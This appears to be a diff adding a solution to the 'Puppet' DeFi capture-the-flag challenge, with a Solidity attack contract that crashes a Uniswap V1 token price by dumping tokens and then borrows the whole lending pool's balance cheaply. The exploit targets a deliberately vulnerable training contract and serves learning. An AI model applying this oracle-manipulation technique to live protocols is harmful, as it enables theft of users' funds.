@@ -92,7 +92,26 @@ contract PuppetChallenge is Test {
      * CODE YOUR SOLUTION HERE
      */
     function test_puppet() public checkSolvedByPlayer {
-        
+        /*
+        The goal of this challenge is to drain the lending pool of all its tokens by borrowing them.
+        The PuppetPool contract requires that the borrower deposits twice the value of the tokens they want to borrow in ETH.
+        It uses the Uniswap pair to calculate the price of the token in ETH.
+        The vulnerability relies that we can interact with the Uniswap pair to manipulate the price of the token.
+        The attack consists of swapping a large amount of tokens for ETH in the Uniswap pair, which will decrease the price of the token.
+        Dumping all the player initial tokens to the uniswap pair will make the price of the token very low, allowing the player to borrow all the tokens from the lending pool.
+        */
+
+
+        // run this test with the following command to avoid calling other puppet tests
+        // forge test --match-contract PuppetChallenge --match-test test_puppet
+
+
+        // Deploy the attack contract
+        AttackPuppet attack = new AttackPuppet{value: PLAYER_INITIAL_ETH_BALANCE}(address(lendingPool), address(token), address(uniswapV1Exchange), recovery);
+        // transfer DVT to the attack contract
+        token.transfer(address(attack), PLAYER_INITIAL_TOKEN_BALANCE);
+        // Execute the attack
+        attack.attack();
     }
 
     // Utility function to calculate Uniswap prices
@@ -115,4 +134,59 @@ contract PuppetChallenge is Test {
         assertEq(token.balanceOf(address(lendingPool)), 0, "Pool still has tokens");
         assertGe(token.balanceOf(recovery), POOL_INITIAL_TOKEN_BALANCE, "Not enough tokens in recovery account");
     }
+}
+
+
+contract AttackPuppet {
+    address public puppetPool;
+    address public player;
+    address public token;
+    address public uniswapV1Exchange;
+    address public recovery;
+
+    uint256 constant POOL_INITIAL_TOKEN_BALANCE = 100_000e18;
+
+    constructor(address _puppetPool, address _token, address _uniswapV1Exchange, address _recovery) payable {
+        puppetPool = _puppetPool;
+        token = _token;
+        uniswapV1Exchange = _uniswapV1Exchange;
+        recovery = _recovery;
+    }
+
+    function attack() public {
+        // Approve the puppet pool to spend all tokens
+        DamnValuableToken(token).approve(puppetPool, type(uint256).max);
+
+        // Swap 1000 DVT for ETH in the Uniswap exchange
+        uint256 tokenBalance = DamnValuableToken(token).balanceOf(address(this));
+        DamnValuableToken(token).approve(uniswapV1Exchange, tokenBalance);
+        IUniswapV1Exchange(uniswapV1Exchange).tokenToEthSwapInput(tokenBalance, 1, block.timestamp);
+
+        // get the token balance in the uniswap pair
+        uint256 tokenBalanceInPair = DamnValuableToken(token).balanceOf(uniswapV1Exchange);
+        console.log("Token balance in pair : %d", tokenBalanceInPair);
+        // get the eth balance in the uniswap pair
+        uint256 ethBalanceInPair = address(uniswapV1Exchange).balance;
+        console.log("Eth balance in pair : %d", ethBalanceInPair);
+
+        uint256 oraclePrice = ethBalanceInPair * 1e18 / tokenBalanceInPair;
+        console.log("Oracle price : %d", oraclePrice);
+
+        // get how much is required to borrow the POOL_INITIAL_TOKEN_BALANCE
+        uint256 depositInEthRequired = PuppetPool(puppetPool).calculateDepositRequired(POOL_INITIAL_TOKEN_BALANCE);
+        console.log("Deposit in eth required : %d", depositInEthRequired);
+
+
+        // get how much is POOL_INITIAL_TOKEN_BALANCE in ETH after the swap
+        // 98308957740657026 wei = 1 DVT = 0.098308957740657026 ETH
+        // i comment out this because the test is using the raw balance of the uniswap pair (eth and token) instead of using the getEthToTokenInputPrice function
+        // uint256 ethToPay = IUniswapV1Exchange(uniswapV1Exchange).getTokenToEthInputPrice(POOL_INITIAL_TOKEN_BALANCE) * 2;
+        // console.log("Total pool token price in eth : %d", ethToPay);
+
+        // Borrow all the tokens from the pool
+        PuppetPool(puppetPool).borrow{value: depositInEthRequired}(POOL_INITIAL_TOKEN_BALANCE, recovery);
+    }
+
+    receive() external payable {}
+
 }
